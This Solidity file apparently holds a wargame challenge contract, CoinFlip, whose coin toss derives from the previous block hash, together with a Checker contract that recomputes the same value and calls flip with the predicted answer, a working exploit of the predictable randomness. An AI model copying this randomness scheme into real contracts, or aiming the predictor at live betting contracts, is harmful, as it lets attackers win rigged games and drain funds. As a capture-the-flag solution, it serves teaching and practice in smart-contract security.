// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

contract CoinFlip {
    uint256 public consectiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    constructor() {
        consectiveWins = 0;
    }
    function flip(bool _guess) public returns(bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1)); 
        
        if(lastHash == blockValue) {
            revert();
        }
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if(side == _guess) {
            consectiveWins++ ;
            return true;
        } else {
            consectiveWins = 0;
            return false;
        }

    }  
} 
contract Checker {
    CoinFlip flipper;

  uint256 private FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;


  constructor(address _targetAddress) {
    flipper = CoinFlip(_targetAddress);
  }

  function check() public  returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number- 1));
    uint256 coinFlip = uint256(uint256(blockValue)/FACTOR);
    bool side = coinFlip == 1 ? true : false;
    flipper.flip(side);

    return side;
  }
}
